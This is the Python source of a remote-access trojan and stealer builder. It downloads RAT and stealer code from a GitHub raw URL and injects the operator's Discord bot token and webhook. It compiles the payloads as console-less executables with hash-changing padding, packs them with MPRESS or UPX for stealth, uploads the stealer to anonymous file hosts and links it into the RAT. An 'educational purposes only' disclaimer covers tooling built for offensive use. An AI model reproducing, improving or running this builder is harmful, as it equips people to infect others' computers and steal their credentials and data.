# Added ALOT more shit 
import hashlib
import os
import random
import shutil
import subprocess
import sys
import requests
import platform
from colorama import init, Fore, Style

# Initialize colorama
init()

def print_banner():
    """Print the application banner."""
    banner = f"""
    {Fore.MAGENTA}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
    {Fore.MAGENTA}┃  {Fore.CYAN}⋆｡°✩ {Fore.YELLOW}Exotically Flexing RAT Builder{Fore.CYAN} ✩°｡⋆     {Fore.MAGENTA}                              ┃
    {Fore.MAGENTA}┃                                                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}ₓ˚. ୭ ˚○◦˚.˚◦○˚ ୧ .˚ₓ{Fore.MAGENTA}                                                      ┃
    {Fore.MAGENTA}┃                                                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}(/ /)     {Fore.YELLOW}Created with love by{Fore.MAGENTA}                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}(^.^)     {Fore.YELLOW}dead exotic & hoa{Fore.MAGENTA}                                                ┃ 
    {Fore.CYAN}┃  c(")(")   {Fore.YELLOW}https://github.com/deadexotic{Fore.MAGENTA}                                    ┃
    {Fore.MAGENTA}┃                                                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}✿ {Fore.CYAN}Features:{Fore.CYAN} ✿ {Fore.MAGENTA}                                                             ┃
    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Remote Access Control                                                    {Fore.MAGENTA}┃
    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Discord Integration                                                      {Fore.MAGENTA}┃
    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Stealer Capabilities                                                     {Fore.MAGENTA}┃
    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Custom Icon Support                                                      {Fore.MAGENTA}┃
    {Fore.MAGENTA}┃                                                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}(◡ ω ◡){Fore.MAGENTA}                                                                    ┃
    {Fore.MAGENTA}┃                                                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}✧･ﾟ: *✧･ﾟ:* {Fore.YELLOW}Let's build something amazing!{Fore.CYAN} *:･ﾟ✧*:･ﾟ✧{Fore.MAGENTA}                      ┃
    {Fore.MAGENTA}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
    """
    print(banner)
def check_requirements():
    """Check and install required modules if needed."""
    required_modules = [
        'discord.py>=2.3.2',
        'pycaw>=20230407',
        'comtypes>=1.2.0', 
        'requests>=2.31.0',
        'pyinstaller>=6.1.0',
        'colorama>=0.4.6',
        'mss>=9.0.1',
        'pynput>=1.7.6',
        'pyautogui>=0.9.54',
        'browserhistory>=0.1.3',
        'pywin32>=306',
        'winreg',
        'urllib3>=2.1.0',
        'pillow>=10.1.0',
        'psutil>=5.9.6',
        'cryptography>=41.0.5',
        'opencv-python>=4.8.1.78',
        'pyperclip>=1.8.2',
        'win32gui',
        'win32con',
        'win32process',
        'pycaw>=20230407',
        'socket',
        'asyncio',
        'json',
        'base64',
        're',
        'shutil',
        'platform',
        'threading',
        'subprocess',
        'datetime',
        'zipfile'
    ]
    missing_modules = []
    for module in required_modules:
        try:
            if module == 'discord.py':
                __import__('discord')
            else:
                __import__(module.split('.', maxsplit=1)[0])
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        print(f"{Fore.CYAN}[✿] Missing required modules: {', '.join(missing_modules)}")
        install = input(f"{Fore.YELLOW}[❀] Would you like to install them now? (y/n): {Style.RESET_ALL}")
        if install.lower() == 'y':
            for module in missing_modules:
                print(f"{Fore.CYAN}[✧] Installing {module}...{Style.RESET_ALL}")
                subprocess.run([sys.executable, "-m", "pip", "install", module], check=False)
            print(f"{Fore.GREEN}[✿] All modules installed successfully! {Fore.CYAN}(｡♥‿♥｡){Style.RESET_ALL}")
            return True
        print(f"{Fore.RED}[✗] Please install the required modules and try again.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[✧] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return False
    return True

def check_curl():
    """Check if curl is installed and install if needed."""
    try:
        subprocess.run(["curl", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        return True
    except FileNotFoundError:
        print(f"{Fore.YELLOW}[!] curl not found on your system.{Style.RESET_ALL}")
        if platform.system() == "Windows":
            install = input(f"{Fore.YELLOW}[?] Do you want to install curl? (y/n): {Style.RESET_ALL}")
            if install.lower() == 'y':
                try:
                    print(f"{Fore.CYAN}[*] Attempting to install curl using winget...{Style.RESET_ALL}")
                    subprocess.run(["winget", "install", "curl"], check=False)
                    return True
                except FileNotFoundError:
                    print(f"{Fore.RED}[!] Could not install curl automatically.{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[i] Will use Python requests module instead.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[i] Will use Python requests module instead.{Style.RESET_ALL}")
        return False

def download_rat_source():
    """Download the RAT source code from GitHub."""
    url = "https://raw.githubusercontent.com/deadexotic/stuff-for-exotically-flexing/refs/heads/main/aaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaa"
    try:
        print(f"{Fore.CYAN}[*] Downloading RAT source code...{Style.RESET_ALL}")
        response = requests.get(url)
        if response.status_code == 200:
            with open("rat_source.py", "w", encoding="utf-8") as f:
                f.write(response.text)
            print(f"{Fore.GREEN}[+] RAT source code downloaded successfully!{Style.RESET_ALL}")
            return True
        print(f"{Fore.RED}[!] Failed to download RAT source code. Status code: {response.status_code}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Using main.py as fallback...{Style.RESET_ALL}")
        try:
            shutil.copy("main.py", "rat_source.py")
            print(f"{Fore.GREEN}[+] Using main.py as RAT source code!{Style.RESET_ALL}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Error using main.py as fallback: {str(e)}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error downloading RAT source code: {str(e)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Using main.py as fallback...{Style.RESET_ALL}")
        try:
            shutil.copy("main.py", "rat_source.py")
            print(f"{Fore.GREEN}[+] Using main.py as RAT source code!{Style.RESET_ALL}")
            return True
        except Exception as e2:
            print(f"{Fore.RED}[!] Error using main.py as fallback: {str(e2)}{Style.RESET_ALL}")
            return False

def download_stealer_source():
    """Download the Stealer source code from GitHub."""
    url = "https://raw.githubusercontent.com/deadexotic/stuff-for-exotically-flexing/refs/heads/main/aaaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbbbbbb"
    try:
        print(f"{Fore.CYAN}[*] Downloading Stealer source code...{Style.RESET_ALL}")
        response = requests.get(url)
        if response.status_code == 200:
            with open("stealer_source.py", "w", encoding="utf-8") as f:
                f.write(response.text)
            print(f"{Fore.GREEN}[+] Stealer source code downloaded successfully!{Style.RESET_ALL}")
            return True
        print(f"{Fore.RED}[!] Failed to download Stealer source code. Status code: {response.status_code}{Style.RESET_ALL}")
        return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error downloading Stealer source code: {str(e)}{Style.RESET_ALL}")
        return False

def insert_token(token):
    """Insert the Discord bot token into the RAT source code."""
    try:
        with open("rat_source.py", "r", encoding="utf-8") as f:
            lines = f.readlines()
        
        # Find the appropriate line to insert the token
        token_line_index = -1
        for i, line in enumerate(lines):
            if "token = " in line or "TOKEN = " in line:
                token_line_index = i
                break
        
        # If token line found, replace it; otherwise insert at line 18
        if token_line_index != -1:
            lines[token_line_index] = f"token = '{token}'\n"
        elif len(lines) >= 18:
            lines.insert(18, f"token = '{token}'\n")
        else:
            # If file is too short, append to the end
            lines.append(f"token = '{token}'\n")
            
        with open("rat_source.py", "w", encoding="utf-8") as f:
            f.writelines(lines)
        
        print(f"{Fore.GREEN}[+] Token inserted successfully!{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error inserting token: {str(e)}{Style.RESET_ALL}")
        return False

def install_packers():
    """Install the necessary packers."""
    print(f"{Fore.CYAN}[*] Checking for packers...{Style.RESET_ALL}")
    
    # Check for UPX
    try:
        subprocess.run(["upx", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        print(f"{Fore.GREEN}[+] UPX is already installed{Style.RESET_ALL}")
    except:
        print(f"{Fore.YELLOW}[!] UPX not found, installing...{Style.RESET_ALL}")
        try:
            if os.name == 'nt':
                # Download UPX for Windows
                url = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"
                r = requests.get(url)
                with open("upx.zip", "wb") as f:
                    f.write(r.content)
                shutil.unpack_archive("upx.zip")
                os.remove("upx.zip")
                # Add to PATH
                os.environ["PATH"] += os.pathsep + os.path.abspath("upx-4.0.2-win64")
            else:
                # Install UPX using package manager
                subprocess.run(["sudo", "apt-get", "install", "upx"], check=True)
            print(f"{Fore.GREEN}[+] UPX installed successfully{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to install UPX: {str(e)}{Style.RESET_ALL}")

    # Check for MPRESS
    try:
        subprocess.run(["mpress", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        print(f"{Fore.GREEN}[+] MPRESS is already installed{Style.RESET_ALL}")
    except:
        print(f"{Fore.YELLOW}[!] MPRESS not found, installing...{Style.RESET_ALL}")
        try:
            if os.name == 'nt':
                # Download MPRESS
                url = "https://www.matcode.com/mpress.219.zip"
                r = requests.get(url)
                with open("mpress.zip", "wb") as f:
                    f.write(r.content)
                shutil.unpack_archive("mpress.zip")
                os.remove("mpress.zip")
                # Add to PATH
                os.environ["PATH"] += os.pathsep + os.path.abspath("mpress")
                print(f"{Fore.GREEN}[+] MPRESS installed successfully{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] MPRESS is only available for Windows{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to install MPRESS: {str(e)}{Style.RESET_ALL}")

def pack_executable(exe_path, packer=None):
    """Pack the executable to make it smaller."""
    if not packer:
        return
        
    print(f"{Fore.CYAN}[*] Packing executable with {packer}...{Style.RESET_ALL}")
    
    try:
        if packer == "upx":
            print(f"{Fore.YELLOW}[!] Warning: UPX packing may increase detection rates{Style.RESET_ALL}")
            subprocess.run(["upx", "--best", exe_path], check=True)
        elif packer == "mpress":
            subprocess.run(["mpress", "-s", exe_path], check=True)
        print(f"{Fore.GREEN}[+] Executable packed successfully with {packer}!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to pack executable: {str(e)}{Style.RESET_ALL}")

def insert_webhook(webhook):
    """Insert the webhook URL into the stealer source code."""
    if not webhook:
        print(f"{Fore.YELLOW}[*] No webhook provided, using default webhook.{Style.RESET_ALL}")
        return True
        
    try:
        with open("stealer_source.py", "r", encoding="utf-8") as f:
            lines = f.readlines()
        
        # Find the appropriate line to insert the webhook
        webhook_line_index = -1
        for i, line in enumerate(lines):
            if "wbhk = " in line:
                webhook_line_index = i
                break
        
        # If webhook line found, replace it; otherwise insert at line 36
        if webhook_line_index != -1:
            lines[webhook_line_index] = f"wbhk = '{webhook}'\n"
        elif len(lines) >= 36:
            lines.insert(36, f"wbhk = '{webhook}'\n")
        else:
            # If file is too short, append to the end
            lines.append(f"wbhk = '{webhook}'\n")
            
        with open("stealer_source.py", "w", encoding="utf-8") as f:
            f.writelines(lines)
        
        print(f"{Fore.GREEN}[+] Webhook inserted successfully!{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error inserting webhook: {str(e)}{Style.RESET_ALL}")
        return False

def upload_to_0x0(file_path):
    """Upload a file to 0x0.st and return the URL."""
    print(f"{Fore.CYAN}[*] Uploading {file_path} to 0x0.st...{Style.RESET_ALL}")
    
    # Try using curl if available
    if check_curl():
        try:
            result = subprocess.run(
                ["curl", "-F", f"file=@{file_path}", "https://0x0.st"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=False
            )
            if result.returncode == 0 and result.stdout.strip().startswith("https://"):
                return result.stdout.strip()
            print(f"{Fore.YELLOW}[!] curl failed, falling back to Python requests.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error using curl: {str(e)}, falling back to Python requests.{Style.RESET_ALL}")
    
    # Fallback to Python requests
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            response = requests.post('https://0x0.st', files=files)
        
        if response.status_code == 200:
            return response.text.strip()
        else:
            print(f"{Fore.RED}[!] Failed to upload file. Status code: {response.status_code}{Style.RESET_ALL}")
            return None
    except Exception as e:
        print(f"{Fore.RED}[!] Error uploading file: {str(e)}{Style.RESET_ALL}")
        return None

def compile_stealer(output_name):
    """Compile the stealer source code into an executable and upload to 0x0.st."""
    try:
        print(f"{Fore.CYAN}[*] Compiling stealer...{Style.RESET_ALL}")
        
        # Check if stealer_source.py exists
        if not os.path.exists("stealer_source.py"):
            print(f"{Fore.RED}[!] stealer_source.py not found. Cannot compile.{Style.RESET_ALL}")
            return None
        
        # Add random data to the executable to change hash
        with open("random_data_stealer.txt", "w", encoding="utf-8") as f:
            random_chars = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') 
                          for _ in range(random.randint(1000, 10000)))
            f.write(random_chars)
        
        stealer_output = f"{output_name}_stealer"
        
        # PyInstaller command with anti-detection options (removed --key option)
        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--add-data", f"random_data_stealer.txt{os.pathsep}.",
            "--name", stealer_output,
            "stealer_source.py"
        ]
        
        # Run PyInstaller or Nuitka based on availability
        try:
            # Try Nuitka first
            nuitka_cmd = [
                "python", "-m", "nuitka",
                "--mingw64",
                "--windows-disable-console",
                "--onefile",
                "--remove-output",
                "--assume-yes-for-downloads",
                "--output-dir=dist",
                "stealer_source.py"
            ]
            
            process = subprocess.run(nuitka_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
            
            if process.returncode == 0:
                print(f"{Fore.GREEN}[+] Successfully compiled with Nuitka{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] Nuitka compilation failed, falling back to PyInstaller{Style.RESET_ALL}")
                process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
                
                if process.returncode != 0:
                    print(f"{Fore.RED}[!] Stealer compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
                    return None

        except Exception:
            print(f"{Fore.YELLOW}[!] Nuitka not found, using PyInstaller{Style.RESET_ALL}")
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
            
            if process.returncode != 0:
                print(f"{Fore.RED}[!] Stealer compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
                return None

        # Check if the executable was created
        exe_path = os.path.join("dist", f"{stealer_output}.exe")
        nuitka_exe = os.path.join("dist", "stealer_source.exe")
        
        if os.path.exists(nuitka_exe):
            exe_path = nuitka_exe
            shutil.move(nuitka_exe, os.path.join("dist", f"{stealer_output}.exe"))
            
        if os.path.exists(exe_path):
            # Copy to current directory
            shutil.copy(exe_path, f"{stealer_output}.exe")
            print(f"{Fore.GREEN}[+] Stealer compiled successfully! Output: {stealer_output}.exe{Style.RESET_ALL}")
            
            # Upload to multiple file hosts
            url = None
            hosts = [
                'https://0x0.st',
                'https://transfer.sh',
                'https://file.io'
            ]
            
            for host in hosts:
                try:
                    with open(f"{stealer_output}.exe", 'rb') as f:
                        if host == 'https://transfer.sh':
                            response = requests.put(f'{host}/{stealer_output}.exe', data=f)
                        else:
                            response = requests.post(host, files={'file': f})
                            
                    if response.status_code == 200:
                        url = response.text.strip()
                        if url:
                            print(f"{Fore.GREEN}[+] Stealer uploaded to: {url}{Style.RESET_ALL}")
                            break
                except:
                    continue
            
            if url:
                return url
            else:
                print(f"{Fore.RED}[!] Failed to upload stealer to any file host{Style.RESET_ALL}")
                return None
                
        print(f"{Fore.RED}[!] Stealer compilation completed but executable not found.{Style.RESET_ALL}")
        return None
            
    except Exception as e:
        print(f"{Fore.RED}[!] Error compiling stealer: {str(e)}{Style.RESET_ALL}")
        return None
    finally:
        # Clean up
        try:
            shutil.rmtree("build", ignore_errors=True)
            shutil.rmtree("dist", ignore_errors=True)
            shutil.rmtree("stealer_source.build", ignore_errors=True)
            if os.path.exists(f"{stealer_output}.spec"):
                os.remove(f"{stealer_output}.spec")
            if os.path.exists("random_data_stealer.txt"):
                os.remove("random_data_stealer.txt")
            if os.path.exists("stealer_source.py"):
                os.remove("stealer_source.py")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Warning: Could not clean up some stealer files: {str(e)}{Style.RESET_ALL}")

def insert_stealer_link(link):
    """Insert the stealer link into the RAT source code."""
    if not link:
        return False
        
    try:
        with open("rat_source.py", "r", encoding="utf-8") as f:
            lines = f.readlines()
        
        # Find line 21 or 22 to insert the link
        if len(lines) >= 22:
            lines.insert(21, f"link = '{link}'\n")
        else:
            # If file is too short, append to the end
            lines.append(f"link = '{link}'\n")
            
        with open("rat_source.py", "w", encoding="utf-8") as f:
            f.writelines(lines)
        
        print(f"{Fore.GREEN}[+] Stealer link inserted successfully!{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error inserting stealer link: {str(e)}{Style.RESET_ALL}")
        return False

def compile_rat(output_name, icon_path=None, packer=None):
    """Compile the RAT source code into an executable."""
    try:
        print(f"{Fore.CYAN}[*] Compiling RAT...{Style.RESET_ALL}")
        
        # Check if rat_source.py exists
        if not os.path.exists("rat_source.py"):
            print(f"{Fore.RED}[!] rat_source.py not found. Cannot compile.{Style.RESET_ALL}")
            return False
        
        # Add random data to the executable to change hash
        with open("random_data.txt", "w", encoding="utf-8") as f:
            random_chars = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') 
                          for _ in range(random.randint(1000, 10000)))
            f.write(random_chars)
        
        # PyInstaller command with anti-detection options 
        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--add-data", f"random_data.txt{os.pathsep}.",
            "--name", output_name,
        ]
        
        # Add icon if provided
        if icon_path and os.path.exists(icon_path):
            cmd.extend(["--icon", icon_path])
        
        cmd.append("rat_source.py")
        
        # Run PyInstaller
        process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        
        if process.returncode != 0:
            print(f"{Fore.RED}[!] Compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
            return False
        
        # Check if the executable was created
        exe_path = os.path.join("dist", f"{output_name}.exe")
        if os.path.exists(exe_path):
            # Copy to current directory
            shutil.copy(exe_path, f"{output_name}.exe")
            print(f"{Fore.GREEN}[+] RAT compiled successfully! Output: {output_name}.exe{Style.RESET_ALL}")
            
            # Pack the executable if requested
            if packer:
                pack_executable(f"{output_name}.exe", packer)
            
            # Clean up
            try:
                shutil.rmtree("build", ignore_errors=True)
                shutil.rmtree("dist", ignore_errors=True)
                if os.path.exists(f"{output_name}.spec"):
                    os.remove(f"{output_name}.spec")
                if os.path.exists("random_data.txt"):
                    os.remove("random_data.txt")
                if os.path.exists("rat_source.py"):
                    os.remove("rat_source.py")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Warning: Could not clean up some files: {str(e)}{Style.RESET_ALL}")
            
            return True
        
        print(f"{Fore.RED}[!] Compilation completed but executable not found.{Style.RESET_ALL}")
        return False
            
    except Exception as e:
        print(f"{Fore.RED}[!] Error compiling RAT: {str(e)}{Style.RESET_ALL}")
        return False

def main():
    """Main function to run the RAT builder."""
    print_banner()
    
    print(f"{Fore.CYAN}[✧] Checking requirements...{Style.RESET_ALL}")
    if not check_requirements():
        return
    
    print(f"\n{Fore.YELLOW}[❀] DISCLAIMER: This tool is for educational purposes only.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[❀] The authors are not responsible for any misuse or damage.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[❀] By continuing, you agree to use this responsibly and legally.{Style.RESET_ALL}\n")
    
    agree = input(f"{Fore.CYAN}[✿] Do you agree? (y/n): {Style.RESET_ALL}")
    if agree.lower() != 'y':
        print(f"{Fore.RED}[✗] Exiting...{Style.RESET_ALL}")
        return
    
    # Get Discord bot token
    token = input(f"{Fore.YELLOW}[?] Enter your Discord bot token: {Style.RESET_ALL}")
    if not token:
        print(f"{Fore.RED}[!] Token cannot be empty.{Style.RESET_ALL}")
        return
    
    # Get webhook (optional)
    webhook = input(f"{Fore.YELLOW}[?] Enter your webhook URL (optional, press Enter to skip): {Style.RESET_ALL}")
    
    # Get output name
    output_name = input(f"{Fore.YELLOW}[?] Enter output file name (default: ExoticallyFlexing): {Style.RESET_ALL}")
    if not output_name:
        output_name = "ExoticallyFlexing"
    
    # Get icon path (optional)
    icon_path = input(f"{Fore.YELLOW}[?] Enter path to custom icon file (optional, press Enter to skip): {Style.RESET_ALL}")
    if icon_path and not os.path.exists(icon_path):
        print(f"{Fore.YELLOW}[!] Icon file not found, using default icon.{Style.RESET_ALL}")
        icon_path = None
    
    # Ask about packing
    print(f"\n{Fore.CYAN}[*] Available packing options:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[1] MPRESS (Recommended - Better stealth){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[2] UPX (Not recommended - Higher detection rate){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[3] No packing{Style.RESET_ALL}")
    
    packer_choice = input(f"{Fore.YELLOW}[?] Choose packing option (1-3): {Style.RESET_ALL}")
    packer = None
    if packer_choice == "1":
        packer = "mpress"
        install_packers()
    elif packer_choice == "2":
        packer = "upx"
        install_packers()
    
    # Download RAT source
    if not download_rat_source():
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    # Insert token
    if not insert_token(token):
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    # Process stealer if webhook provided
    stealer_link = None
    if webhook:
        # Download stealer source
        if download_stealer_source():
            # Insert webhook
            if insert_webhook(webhook):
                # Compile stealer and upload to 0x0.st
                stealer_link = compile_stealer(output_name)
                if stealer_link:
                    # Insert stealer link into RAT source
                    insert_stealer_link(stealer_link)
    
    # Compile RAT
    if not compile_rat(output_name, icon_path, packer):
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.GREEN}[+] Build completed successfully!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Your RAT is ready: {output_name}.exe{Style.RESET_ALL}")
    if stealer_link:
        print(f"{Fore.GREEN}[+] Stealer uploaded to: {stealer_link}{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[i] Thanks for using Exotically Flexing RAT Builder!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[i] Created by dead exotic & hoa{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[i] GitHub: https://github.com/deadexotic{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
